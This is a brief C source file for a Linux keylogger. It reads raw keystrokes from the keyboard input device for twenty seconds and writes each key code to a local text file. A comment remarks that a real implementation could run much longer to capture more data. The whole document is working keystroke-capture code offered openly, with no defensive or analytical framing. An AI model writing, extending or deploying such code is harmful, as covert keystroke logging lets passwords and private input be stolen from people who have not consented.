#include "header.h"

void keyLogger()
{
	// Creates KeyLoggerData txt file for keylogger data
	FILE *f = fopen("KeyLoggerData.txt", "a+");

	// Timer to determine how long key logger will be run
	time_t begin, finish;
	double timer;  
	int fd;
	// Gets Linux keyboard
	fd = open("/dev/input/by-path/platform-i8042-serio-0-event-kbd", O_RDONLY);
	struct input_event ev;
	begin = time(NULL);
	int clockRunning = 1;
	// Reads keystrokes whie it is running
	while (clockRunning) {
		read(fd, &ev, sizeof(struct input_event));
		if(ev.type == 1) {
			fprintf(f, "key #%i, in process %i\n", ev.code, ev.value);
		}

		finish = time(NULL);
		timer = difftime(finish, begin);
		if (timer >= 20 ) {//only tracks for twenty seconds in example, an actual implementaion could go much longer to track alot more data
			clockRunning = 0;
		}
	}
	fclose(f);
}




